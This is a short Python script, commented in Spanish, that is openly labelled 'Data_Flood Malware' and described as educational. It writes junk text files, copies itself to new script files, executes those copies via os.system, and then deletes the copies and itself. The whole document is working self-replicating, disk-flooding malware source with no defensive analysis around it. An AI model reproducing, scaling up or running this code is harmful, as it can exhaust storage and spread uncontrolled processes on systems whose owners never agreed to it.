#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''Data_Flood Malware
   Creado por Pau Rosselló(prossellob) el 18/8/2017.
   Creado con fines educativos, se prohibe el uso de este código para usos con fines lucrativos o dañinos.
'''

import os,shutil,random
number_of_rep = 10
text_files = 1
sons = 1  #Archivos que imitaran al script madre
i,x,y = 1,0,0

while i <= text_files:
    txt = open(str(i + int(random.randrange(100))) + '.txt','a')
    txt.write('Data_Flood' * number_of_rep + '\n' ) #10 bytes * nº rep
    i += 1

if __file__ == 'Data_Flood.py': #Solo puede tener hijos el script madre
    while x < sons:
        shutil.copyfile('Data_Flood.py',str(x) + 'Data_Flood.py')
        os.system('python3 ' + str(x) + 'Data_Flood.py')
        x += 1

    while y < sons: #Autodestrucción de toda la familia
        os.remove(str(y) + 'Data_Flood.py')
        y += 1

    os.remove('Data_Flood.py')
